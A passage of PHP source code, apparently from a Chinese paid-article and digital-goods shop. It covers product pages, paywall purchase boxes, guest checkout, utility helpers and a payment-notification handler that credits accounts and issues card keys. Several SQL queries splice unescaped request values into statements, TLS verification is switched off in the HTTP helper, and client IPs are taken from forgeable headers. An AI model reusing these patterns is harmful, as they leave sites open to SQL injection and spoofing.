                        		$P_sc = $P_sc . "<label data-pic='' data-title='".$sc[$i]."' data-rest='".$gg_rest."' data-restTitle='".$gg_rest_title."' data-price='".p($gg_price[$i])."' aa='scvvvvv_" . $j . "'><input type='radio' name='scvvvvv_" . $j . "' id='" . $j . "_" . $i . "' value='" . $i . "'> " . $sc[$i] . "</label> ";
                        	}
                            
                            $P_sc2 = $P_sc2 . $sc[$i] . " / ";
                        }
                        $P_sc = $P_sc . "</div></div>";
                        $P_sc2 = substr($P_sc2, 0, strlen($P_sc2) - 2);
                        $P_sc2 = $P_sc2 . "<br>";
                    }
                }
            }

			$gg=$gg.$P_js.$P_sc;
			$t = str_Replace("[P_gg]",$gg,$t);
	}

	switch ($P_selltype) {
		case 0:
			$P_resttitle="充足";
			$P_rest=999999999;
			break;

			case 1:
			$P_resttitle=getrs("select count(C_id) as C_count from sl_card where C_sort=".intval($P_sell)." and C_use=0 and C_del=0","C_count")."件";
			$P_rest=getrs("select count(C_id) as C_count from sl_card where C_sort=".intval($P_sell)." and C_use=0 and C_del=0","C_count");
			break;

			case 2:
			$P_resttitle=$P_restx."件";
			$P_rest=$P_restx;
			break;
	}


	$sql="select P_pic,P_time,P_id,P_title from sl_product where P_id = (select P_id from sl_product where P_id < $id and P_del=0 order by P_id desc limit 1)";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if($row["P_id"]==""){
		$P_Ntitle="没有了";
		$P_Nurl="javascript:;";
		$P_Ntime="";
		$P_Npic="";
	}else{
		$P_Ntitle=$row["P_title"];
		$P_Nurl="?type=productinfo&id=".$row["P_id"];
		$P_Ntime=$row["P_time"];
		$P_Npic=pic(splitx($row["P_pic"],"|",0));
	}

	$sql="select P_pic,P_time,P_id,P_title from sl_product where P_id = (select P_id from sl_product where P_id > $id and P_del=0 order by P_id asc limit 1)";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if($row["P_id"]==""){
		$P_Ptitle="没有了";
		$P_Purl="javascript:;";
		$P_Ptime="";
		$P_Ppic="";
	}else{
		$P_Ptitle=$row["P_title"];
		$P_Purl="?type=productinfo&id=".$row["P_id"];
		$P_Ptime=$row["P_time"];
		$P_Ppic=pic(splitx($row["P_pic"],"|",0));
	}

	$t = str_Replace("[P_resttitle]",$P_resttitle,$t);
	$t = str_Replace("[P_rest]",$P_rest,$t);
	$t = str_Replace("[P_Ntitle]",$P_Ntitle,$t);
	$t = str_Replace("[P_Nurl]",$P_Nurl,$t);
	$t = str_Replace("[P_Ptitle]",$P_Ptitle,$t);
	$t = str_Replace("[P_Purl]",$P_Purl,$t);
	$t = str_Replace("[P_Ptime]",$P_Ptime,$t);
	$t = str_Replace("[P_Ppic]",$P_Ppic,$t);
	$t = str_Replace("[P_Ntime]",$P_Ntime,$t);
	$t = str_Replace("[P_Npic]",$P_Npic,$t);

	if($_SESSION["M_id"]==""){
		$fh_info="";
	}else{
		if($P_selltype==0 || $P_selltype==1){
			$fh_info="<div class=\"P_address\">[自动发货] 收件邮箱：".getrs("select * from sl_member where M_id=".$_SESSION["M_id"],"M_email")." <a href=\"member/edit.php\" target=\"_balnk\">[编辑]</a></div>";
		}else{

			$sql="select * from sl_address where A_del=0 and A_mid=".$_SESSION["M_id"];
			$result = mysqli_query($conn, $sql);
			
			if (mysqli_num_rows($result) > 0) {
				while($row = mysqli_fetch_assoc($result)) {
					if($row["A_default"]==1){
						$d="checked=\"checked\"";
					}else{
						$d="";
					}
					$fh=$fh."<p><label aa=\"A_address\"><input type=\"radio\" name=\"A_address\" value=\"".$row["A_id"]."\" ".$d."> ".$row["A_address"]." ".$row["A_name"]." ".$row["A_phone"]."</label></p>";
				}
				$fh_info="<div class=\"P_address\">选择收货地址 <a href=\"member/address.php\" target=\"_balnk\">[编辑]</a>：".$fh."  </div>";
			}else{
				$fh_info="<div class=\"P_address\">选择收货地址 ：暂无收货地址 <a href=\"member/address.php\" target=\"_balnk\">[新增]</a></div>";
			}
		}
	}
	$t = str_Replace("[fh_address]","<style>.P_address{padding:10px;margin:10px 0;border:dashed 1px #DDDDDD;width:100%;border-radius:10px;box-shadow:0px 2px 10px #CCCCCC}</style>".$fh_info,$t);
	return $t;
}

function buynews($color,$N_price,$id){
  global $conn,$C_n_discount,$C_n_discount2,$C_fx1,$C_fx2,$C_fx3;
  $genkey=date('YmdHis').rand(100000,999999).rand(100000,999999);
  $sql="select * from sl_member where M_id=".intval($_SESSION["M_id"]);
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {

      $M_viptime=$row["M_viptime"];
      $M_viplong=$row["M_viplong"];

      if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
      	$M_vip=1;
      	if($M_viplong>30000){
      		$discount=$C_n_discount2/10;
      	}else{
      		$discount=$C_n_discount/10;
      	}
        
        $fee="<b style=\"color:".$color."\">".round($N_price*$discount,2)."元</b>[<del>原价：".$N_price."元</del>]";
      }else{
      	$M_vip=0;
        $discount=1;
        $fee="<b style=\"color:".$color."\">".$N_price."元</b>";
      }
    }else{
    	$M_vip=0;
      	$discount=1;
      	$fee="<b style=\"color:".$color."\">".$N_price."元</b>";
    }
  $N=getrs("select * from sl_news where N_id=".$id);

  $N_long=$N["N_long"];
  $N_date=$N["N_date"];
  $N_uncopy=$N["N_uncopy"];
  $N_fx=$N["N_fx"];
  $N_viponly=$N["N_viponly"];
	if($N_long>0){
		$N_longinfo="<br>[限时收费]本文章将在<span style=\"color:$color\">".date("Y-m-d H:i:s",strtotime("+$N_long hour",strtotime($N_date)))."</span>后免费开放阅读";
	}else{
		$N_longinfo="";
	}
  $api=$api."
  <style>
  .fh100_news_box{text-align:center;width:clac(100% - 40px);max-width:600px;margin:0 auto;border-radius:10px;border:dashed 1px ".$color.";padding:20px;box-shadow:0px 2px 10px #CCCCCC;font-size:15px}
  .fh100_news_btn{color:#ffffff !important;background:".$color.";display:inline-block;margin-top:10px;border-radius:10px;border:solid 1px ".$color.";padding:0 10px;font-size:15px}
  .fh100_news_btn:hover{color:".$color." !important;background:#ffffff;border:solid 1px ".$color.";}
  .fh100_qr_buy{display:inline-block;vertical-align:top;width:100px;margin-right:15px;}
  .fh100_qr_buy div{font-size:12px;}
  .fh100_news_buy{display:inline-block}
  .fh100_news_buy a{text-align:center}
  </style>";
  $api=$api."<form action=\"buy.php?type=newsinfo&id=$id\" method=\"post\">
        <div class=\"fh100_news_box\">";
		if(!isMobile()){
			$api=$api."<div class=\"fh100_qr_buy\">
		        	<div id=\"billImage\"></div>
		        	<div>扫码免登录支付</div>
		        </div>";
		}
        $api=$api."<div class=\"fh100_news_buy\">";

		if($N_viponly==1 && $M_vip==0){
			$api=$api."<div>本文章为付费文章，是否<b style=\"color:".$color."\">开通VIP</b>后完整阅读？</div>";
		}else{
			$api=$api."<div>本文章为付费文章，是否支付".$fee."后完整阅读？</div>";
		}
      
        $api=$api."<p style=\"font-size:12px;color:#AAAAAA\">如果您已购买过该文章，<a href=\"member/login.php?from=".urlencode("../?type=newsinfo&id=$id")."\">[登录帐号]</a>后即可查看".$N_longinfo."</p>
        <input type=\"hidden\" name=\"genkey\" value=\"$genkey\">";

		if($N_viponly==1 && $M_vip==0){
			$api=$api."<button class=\"fh100_news_btn\" onclick=\"window.location.href='member/vip.php'\" type=\"button\">开通VIP后查看</button>";
		}else{
			$api=$api."<button class=\"fh100_news_btn\">支付".round($N_price*$discount,2)."元</button>";
		    //if(intval($_SESSION["M_id"])==0){
		    //	$api=$api." <button onclick=\"window.location.href='member/unlogin.php?type=news&id=$id&genkey=$genkey'\" class=\"fh100_news_btn\" type=\"button\">免登录支付</button>";
		    //}
		    if($N_fx==1 && ($C_fx1>0 || $C_fx2>0 || $C_fx3>0) ){
			 $api=$api." <button onclick=\"window.location.href='conn/poster.php?type=news&id=$id&from=".intval($_SESSION["M_id"])."'\" class=\"fh100_news_btn\" type=\"button\">赚佣金</button>";
			}
		}

        $api=$api."</div>
        </div>
        </form>";
	if(!isMobile()){
		$api=$api."<script src=\"js/qrcode.min.js\"></script>
		<script>
		var qrcode = new QRCode('billImage', {width: 100,height: 100,colorDark: '#000000',colorLight: '#ffffff',correctLevel: QRCode.CorrectLevel.H});
		qrcode.makeCode(\"".gethttp().splitx($_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'],"index.php",0)."member/unlogin.php?type=news&id=$id&genkey=$genkey\");
		</script>";
	}
$api=$api."<script>
function getQueryVariable(variable){
       var query = window.location.search.substring(1);
       var vars = query.split(\"&\");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split(\"=\");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}
function news_post(){
	\$.post(\"conn/f.php?action=checknewsbuy&id=$id\",
    {
      genkey:getQueryVariable(\"genkey\"),
    },
  function(data){
  	data = JSON.parse(data);
	  if(data.code==\"success\"){
	  	\$(\"#N_tx\").html(data.msg);
	  }
    });
}
setTimeout(\"news_post()\",500);
</script>";
if($N_uncopy==1){
	$api=$api."<script language=\"Javascript\">  
		document.oncontextmenu=new Function(\"event.returnValue=false\");  
		document.onselectstart=new Function(\"event.returnValue=false\");  
		</script>";
}
  return $api;
}

function unlogin_product($class,$id,$genkey='a'){
	global $conn,$C_fx1,$C_fx2,$C_fx3;
	if($genkey=="a"){
		$genkey=date('YmdHis').rand(1000,9999);
	}

	$sql="select * from sl_product where P_id=".intval($id);
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	$P_id=p($row["P_id"]);
	$P_price=p($row["P_price"]);
	$P_unlogin=$row["P_unlogin"];
	$P_fx=$row["P_fx"];
	$P_taobao=$row["P_taobao"];
	$P_code=$row["P_code"];

	if($P_code!=""){
		$unlogin=$unlogin." <div style=\"display:inline-block;vertical-align:top;\" id=\"P_code\"><button class=\"$class\" onclick=\"code()\" type=\"button\">免费兑换</button></div>";
	}

	$unlogin=$unlogin." <button class=\"$class\" onclick=\"addcart()\" type=\"button\" id=\"cart_btn\">加入购物车</button>";

	if(splitx($P_taobao,"|",1)!=""){
		$unlogin=$unlogin." <a class=\"$class\" href=\"".splitx($P_taobao,"|",1)."\" target=\"_blank\">演示地址</a>";
	}

	$info=$unlogin."<input type=\"hidden\" name=\"genkey\" value=\"$genkey\">
	<script>
	function code(){
		$(\"#P_code\").html(\"<input type='text' name='P_code' id='duihuan' placeholder='兑换码' style='border:none;border-bottom:solid 1px #DDDDDD;vertical-align:bottom;height:30px;outline: none;'><button class='$class' onclick='getp()' type='button'>兑换</button>\");
	}
	function getp(){
		$.ajax({
		        type: \"POST\",
		        url: \"conn/f.php?action=getp&id=$P_id\",
		        data: $(\"#buy\").serialize(),
		        success:function(d){
		            if(d==\"success\"){
		              window.location.href=\"member/unlogin.php?genkey=$genkey\";
		            }else{
		              alert(d);
		            }
		       }
		     });
	}
	</script>
	";
	if(splitx($P_taobao,"|",0)==""){
		return $info;
	}else{
		return "<div style=\"display:inline-block;font-size:12px;vertical-align:bottom\">说明：将会跳转到<a href=\"".splitx($P_taobao,"|",0)."\" target=\"_blank\">外部链接</a>购买</div>";
	}
}

function unlogin_product_qr($id,$genkey='a'){
	if($genkey=="a"){
		$genkey=date('YmdHis').rand(1000,9999);
	}
	$info="https://static.websiteonline.cn/website/qr/index.php?url=".urlencode(gethttp().splitx($_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'],"index.php",0)."member/unlogin.php?type=product&id=".$id."&genkey=".$genkey);
	return $info;
}

function getrs($sqlx,$valuex=""){
	global $conn;
	$resultx = mysqli_query($conn,$sqlx);
	$rowx = mysqli_fetch_assoc($resultx);
	if (mysqli_num_rows($resultx) > 0) {
		if($valuex==""){
			return $rowx;
		}else{
			return $rowx[$valuex];
		}
	}else{
		return "";
	}
}

function getlist($sql){
	global $conn;
		$result = mysqli_query($conn, $sql);
		$arr = array();  
		while($row = mysqli_fetch_array($result)) {
		$count=count($row);
		  for($i=0;$i<$count;$i++){ 
		    unset($row[$i]);
		  }   
	    array_push($arr,$row);
	} 
	return $arr;
}

function gen_key($length,$type=1) { 
	switch ($type){
		case 1:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
		break;
		case 2:
		$chars = '0123456789'; 
		break;
		case 3:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
		break;
		case 4:
		$chars = 'abcdefghijklmnopqrstuvwxyz'; 
		break;
		default:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
	}

	$password = ''; 
	for ( $i = 0; $i < $length; $i++ ) { 
	$password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; 
	} 
	return $password; 
} 

function diffBetweenTwoDays ($day1, $day2)
{
  $second1 = strtotime($day1);
  $second2 = strtotime($day2);

  return round(($second2 - $second1) / 86400,0);
}

function splitx($a,$b,$c){
	$d=explode($b,$a);
	return $d[$c];
}

function GetBody($url, $xml,$method='POST'){    
    $second = 30;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_TIMEOUT, $second);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    $data = curl_exec($ch);
    if($data){
      curl_close($ch);
      return $data;
    } else { 
      $error = curl_errno($ch);
      curl_close($ch);
      return false;
    }
}

function isMobile() {
  if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) {
    return true;
  }
  if (isset($_SERVER['HTTP_VIA'])) {
    return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
  }
  if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $clientkeywords = array('nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile');
    if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
      return true;
    }
  }

  if (isset ($_SERVER['HTTP_ACCEPT'])) {
    if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
      return true;
    }
  }
  return false;
}

function isWeixin() {
  if (strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false) {
    return true;
  } else {
    return false;
  }
}

function getip(){
    static $realip;
    if (isset($_SERVER)){
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
            $realip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else if (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $realip = $_SERVER["HTTP_CLIENT_IP"];
        } else {
            $realip = $_SERVER["REMOTE_ADDR"];
        }
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR")){
            $realip = getenv("HTTP_X_FORWARDED_FOR");
        } else if (getenv("HTTP_CLIENT_IP")) {
            $realip = getenv("HTTP_CLIENT_IP");
        } else {
            $realip = getenv("REMOTE_ADDR");
        }
    }
    if(filter_var($realip, FILTER_VALIDATE_IP)) {
    	return $realip;
    }else{
    	return "::1";
    }
}

Function DateAdd($part, $n, $date,$type="Y-m-d"){
switch($part){
case "y": $val = date($type, strtotime($date ." +$n year")); break;
case "m": $val = date($type, strtotime($date ." +$n month")); break;
case "w": $val = date($type, strtotime($date ." +$n week")); break;
case "d": $val = date($type, strtotime($date ." +$n day")); break;
case "h": $val = date($type, strtotime($date ." +$n hour")); break;
case "n": $val = date($type, strtotime($date ." +$n minute")); break;
case "s": $val = date($type, strtotime($date ." +$n second")); break;
}
return $val;
}

function box($B_text,$B_url,$B_type){
if ($B_url=="back"){
	echo "<script>alert('".$B_text."');history.back();</script>";
}else{
	echo "<script>alert('".$B_text."');window.location.href='".$B_url."';</script>";
}
die();
}

function geturl(){
	return gethttp().$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
}

function CopyMyFolder($source, $dest){
    if (!file_exists($dest)) mkdir($dest);
    $handle = opendir($source);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $_source = $source . '/' . $item;
        $_dest = $dest . '/' . $item;
        if (is_file($_source)) copy($_source, $_dest);
        if (is_dir($_source)) CopyMyFolder($_source, $_dest);
    }
    closedir($handle);
}


function DeleteFolder($path){
    $handle = opendir($path);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $_path = $path . '/' . $item;
        if (is_file($_path)) unlink($_path);
        if (is_dir($_path)) DeleteFolder($_path);
    }
    closedir($handle);
    return rmdir($path);
}

function t($str){
	global $conn;
    return mysqli_real_escape_string($conn,$str);
}

function CheckFields($myTable,$myFields){
	global $conn;
	$field = mysqli_query($conn,"Describe ".$myTable." ".$myFields);  
	$field = mysqli_fetch_array($field);  
	if($field[0]){  
		return 1;
	}else{
		return 0;
	}
}

function CheckTables($myTable){
	global $conn;
	$field = mysqli_query($conn,"SHOW TABLES LIKE '". $myTable."'");  
	$field = mysqli_fetch_array($field);  
	if($field[0]){  
		return 1;
	}else{
		return 0;
	}
}

function enname($name){
	if($name=="未登录帐号"){
		return "免登录购买";
	}else{
		return mb_substr($name,0,1,"utf-8")."***";
	}
	
}

function xcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;   
    $key = md5($key ? $key : $GLOBALS['discuz_auth_key']);   
    $keya = md5(substr($key, 0, 16));   
    $keyb = md5(substr($key, 16, 16));   
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length):substr(md5(microtime()), -$ckey_length)) : '';    
    $cryptkey = $keya.md5($keya.$keyc);   
    $key_length = strlen($cryptkey);   
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;   
    $string_length = strlen($string);   
    $result = '';   
    $box = range(0, 255);   
    $rndkey = array();     
    for($i = 0; $i <= 255; $i++) {   
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);   
    }    
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }   
    for($a = $j = $i = 0; $i < $string_length; $i++) {   
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;   
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if($operation == 'DECODE') {   
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {   
            return substr($result, 26);   
        } else {   
            return '';   
        }   
    } else { 
        return $keyc.str_replace('=', '', base64_encode($result));   
    }   
}

function removeDir($dirName) 
{ 
    if(! is_dir($dirName)) 
    { 
        return false; 
    } 
    $handle = @opendir($dirName); 
    while(($file = @readdir($handle)) !== false) 
    { 
        if($file != '.' && $file != '..') 
        { 
            $dir = $dirName . '/' . $file; 
            is_dir($dir) ? removeDir($dir) : @unlink($dir); 
        } 
    } 
    closedir($handle); 
      
    return rmdir($dirName) ; 
} 

function notify($no,$type,$id,$genkey,$email,$num,$M_id,$money,$D_domain,$paytype,$no2=''){
	global $conn,$C_n_discount,$C_p_discount,$C_n_discount2,$C_p_discount2,$C_email,$C_fx1,$C_fx2,$C_fx3,$C_fen1,$C_mobile,$C_smssign,$C_dx5,$fmid;
	if($money<0 || $num<1){
		return false;//订单金额错误或数量错误
	}else{
		$sql="select * from sl_member where M_id=".intval($M_id);
	    $result = mysqli_query($conn, $sql);
	    $row = mysqli_fetch_assoc($result);
	    $M_id=$row["M_id"];
	    $M_email=$row["M_email"];
	    $M_money=$row["M_money"];
	    $M_viptime=$row["M_viptime"];
	    $M_viplong=$row["M_viplong"];

	    if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
	        $M_vip=1;
	        if($M_viplong>30000){
	        	$N_discount=$C_n_discount2/10;
	        	$P_discount=$C_p_discount2/10;
	        }else{
	        	$N_discount=$C_n_discount/10;
	        	$P_discount=$C_p_discount/10;
	        }
	    }else{
	        $M_vip=0;
	        $N_discount=1;
	        $P_discount=1;
	    }

		$sql = "select * from sl_list where L_no='" . $no . "'";
	    $result = mysqli_query($conn, $sql);
	    $row = mysqli_fetch_assoc($result);
	    if (mysqli_num_rows($result) <= 0) {
	        
	        if($type=="news"){//文章
				$sql2="select * from sl_news where N_del=0 and N_id=".$id;
				$result2 = mysqli_query($conn, $sql2);
				$row2 = mysqli_fetch_assoc($result2);
				if (mysqli_num_rows($result2) > 0) {
					$N_title=$row2["N_title"];
					$N_pic=$row2["N_pic"];
					$N_price=p($row2["N_price"]*$N_discount);
					$N_price2=round($row2["N_price2"],2);
					$N_mid=$row2["N_mid"];
					$N_fx=$row2["N_fx"];
				}

				if($N_price==$money){
					if($paytype=="余额支付"){
						mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
					}else{
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
					}
					
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_no2) values($M_id,'$no','文章付费阅读','".date('Y-m-d H:i:s')."',-".$money.",'$genkey','$no2')");

					mysqli_query($conn, "update sl_orders set O_state=1 where O_genkey='$genkey'");
					if($N_mid!=$M_id){
						mysqli_query($conn, "update sl_member set M_fen=M_fen+".($money*$C_fen1)." where M_id=$M_id");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_type) values($M_id,'$no','文章付费阅读','".date('Y-m-d H:i:s')."',".($money*$C_fen1).",'$genkey',1)");
					}
					if($N_mid>0){
						mysqli_query($conn, "update sl_member set M_money=M_money+".$money." where M_id=$N_mid");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($N_mid,'".date('YmdHis').rand(10000000,99999999)."','售出文章-".$N_title."','".date('Y-m-d H:i:s')."',$money,'')");
					}else{
						sendmail("有用户通过".$paytype."阅读文章","用户ID：".$M_id."<br>文章名称：".$N_title."<br>订单金额：".$money."元<br>交易单号：".$no,$C_email);
						$_SESSION["time2"]=0;
						if($C_dx5==1){
							sendsms("【".$C_smssign."】有用户通过".$paytype."阅读文章，用户ID：".$M_id."，文章名称：".$N_title."，订单金额：".$money."元，交易单号：".$no,$C_mobile);
						}
					}
					if($fmid>0 && $N_mid==0){//只有主站文章加提成
						if($N_price2-$money>0){
							$N_price2=$money;
						}
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出文章','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','".date('Y-m-d H:i:s')."',-".$N_price2.",'$genkey')");
						mysqli_query($conn, "update sl_member set M_money=M_money+".($money-$N_price2)." where M_id=$fmid");
					}
					if($N_fx==1){
						fx($money,$M_id,$N_mid);
					}
					sendmail("查收您的付费阅读文章", "<p>感谢您购买文章《".$N_title."》阅读</p><p>阅读链接：".gethttp().$D_domain."/?type=newsinfo&id=".$id."&genkey=".$genkey."</p><p>订单编号；".$genkey."</p>", getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address"));
				}
	        }

	        if($type=="course"){//课程
	        	$O=getrs("select * from sl_orders where O_genkey='$genkey'");
	        	if($O["O_price"]*$O["O_num"]==$money){
	        		if($paytype=="余额支付"){
						mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
					}else{
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
					}
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_no2) values($M_id,'$no','开通在线课程','".date('Y-m-d H:i:s')."',-".$money.",'$genkey','$no2')");
					mysqli_query($conn, "update sl_orders set O_state=1 where O_genkey='$genkey'");
					if($N_mid!=$M_id){
						mysqli_query($conn, "update sl_member set M_fen=M_fen+".($money*$C_fen1)." where M_id=$M_id");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_type) values($M_id,'$no','开通在线课程','".date('Y-m-d H:i:s')."',".($money*$C_fen1).",'$genkey',1)");
					}
					sendmail("有用户通过".$paytype."购买课程","用户ID：".$M_id."<br>课程名称：".$O["O_title"]."<br>订单金额：".$money."元<br>交易单号：".$no,$C_email);
					if($C_dx5==1){
						sendsms("【".$C_smssign."】有用户通过".$paytype."购买课程，用户ID：".$M_id."，课程名称：".$O["O_title"]."，订单金额：".$money."元，交易单号：".$no,$C_mobile);
					}
	        	}
	        }

	        if($type=="product"){//商品
				$sql2="select * from sl_product where P_del=0 and P_id=".$id;
				$result2 = mysqli_query($conn, $sql2);
				$row2 = mysqli_fetch_assoc($result2);
				if (mysqli_num_rows($result2) > 0) {
					$P_title=$row2["P_title"];
					$P_pic=$row2["P_pic"];
					$P_sell=$row2["P_sell"];
					$P_selltype=$row2["P_selltype"];
					$P_ggsell=$row2["P_ggsell"];
					$P_gg=$row2["P_gg"];
					if($row2["P_vip"]==1){
						$P_price=p($row2["P_price"]*$P_discount);
						$P_price2=round($row2["P_price2"],2);
					}else{
						$P_price=p($row2["P_price"]);
						$P_price2=round($row2["P_price2"],2);
					}
					
					$P_mid=$row2["P_mid"];
					$P_fx=$row2["P_fx"];
				}

				$O=getrs("select * from sl_orders where O_genkey='$genkey'");
				if(round($O["O_price"]*$num-$O["O_quan"]+$O["O_postage"],2)==round($money,2)){//验证订单金额
					if($P_ggsell=="" || $O["O_gg"]=="标配" || $O["O_gg"]==""){//如果没有设置各项发货
						switch($P_selltype){
						  	case 0:
						  		$O_content=$P_sell;
						  		$O_address=$O["O_address"];
						  		$O_state=1;
						  		$O_html=0;
						  	break;
						  	case 1:
						  		for($i=0;$i<$num;$i++){
									$C_id=getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=".intval($P_sell),"C_id");
									$C_content=getrs("select * from sl_card where C_id=".intval($C_id),"C_content");
									if($C_content==""){
										$O_content=$O_content."商品缺货，请联系客服||";
									}else{
										$O_content=$O_content.$C_content."||";
									}
									mysqli_query($conn,"update sl_card set C_use=1 where C_id=".intval($C_id));
								}
								$O_content=substr($O_content,0,strlen($O_content)-2);
								$O_address=$O["O_address"];
								$O_state=1;

						  	break;
						  	case 2:
						  		mysqli_query($conn,"update sl_product set P_rest=P_rest-$num where P_id=".$id);
						  		$O_content="实物商品，由商家手动发货";
						  		$O_address=$O["O_address"];
						  		$O_state=2;
						  		$O_html=0;
						  	break;
						}
					}else{//单项发货
						$O_gg=splitx($O["O_gg"],"|",0);
						$gg=splitx(splitx($P_gg,"@",0),"_",1);
						$gg=explode("|",$gg);
						for($z=0;$z<count($gg);$z++){
							if($O_gg==$gg[$z]){
								switch(splitx(splitx($P_ggsell,"\n",$z),"|",0)){
								  	case 0:
								  		$O_content=splitx(splitx($P_ggsell,"\n",$z),"|",1);
								  		$O_address=$O["O_address"];
								  		$O_state=1;
								  		$O_html=0;
								  	break;
								  	case 1:
								  		for($i=0;$i<$num;$i++){
											$C_id=getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=".intval(splitx(splitx($P_ggsell,"\n",$z),"|",1)),"C_id");
											$C_content=getrs("select * from sl_card where C_id=".intval($C_id),"C_content");
											if($C_content==""){
												$O_content=$O_content."商品缺货，请联系客服||";
											}else{
												$O_content=$O_content.$C_content."||";
											}
											mysqli_query($conn,"update sl_card set C_use=1 where C_id=".intval($C_id));
										}
										$O_content=substr($O_content,0,strlen($O_content)-2);
										$O_address=$O["O_address"];
										$O_state=1;
								  	break;
								  	case 2:
								  		mysqli_query($conn,"update sl_product set P_rest=P_rest-$num where P_id=".$id);
								  		$O_content="实物商品，由商家手动发货";
								  		$O_address=$O["O_address"];
								  		$O_state=2;
								  		$O_html=0;
								  	break;
								}
							}
						}
					}

					$OX=explode("|",$O["O_title"]."|".$O["O_gg"]);
					for($i=0;$i<count($OX);$i++){
						if(strpos($OX[$i],"个月")!==false){
							$long=intval(splitx($OX[$i],"个月",0));
							if($long>0){
								mysqli_query($conn, "update sl_orders set O_time2='".date('Y-m-d H:i:s',strtotime('+'.$long.' month'))."',O_today='".date('Y-m-d H:i:s')."' where O_genkey='$genkey'");
							}
						}
						if(strpos($OX[$i],"年")!==false){
							$long=intval(splitx($OX[$i],"年",0));
							if($long>0){
